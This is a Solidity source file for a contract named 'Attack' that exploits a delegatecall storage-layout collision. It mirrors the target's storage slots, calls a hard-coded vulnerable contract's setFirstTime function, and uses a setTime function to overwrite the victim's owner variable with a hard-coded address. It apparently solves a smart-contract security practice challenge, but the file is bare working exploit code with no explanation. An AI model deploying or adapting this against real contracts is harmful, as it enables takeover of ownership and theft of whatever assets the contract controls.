// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;


contract Attack {
    
 address public timeLibrary1;
 address public timeLibrary2;
 address public owner;
 uint storedTime;
 address public vulnerableContract = 0xe526c3Bdf14917a2f166f3e4Cd9825af5499CD89;
 bytes4 constant setFirstTimeSignature = bytes4(keccak256("setFirstTime(uint256)"));
 function attackFunction(uint _timestamp)  public{
     
        vulnerableContract.call(abi.encodePacked(setFirstTimeSignature,_timestamp));
     
 }

 function setTime(uint _timestamp) public {
     owner = address(0xD436DaD4248373C7F4D7a5d078aBb0d784420462);
 }





}
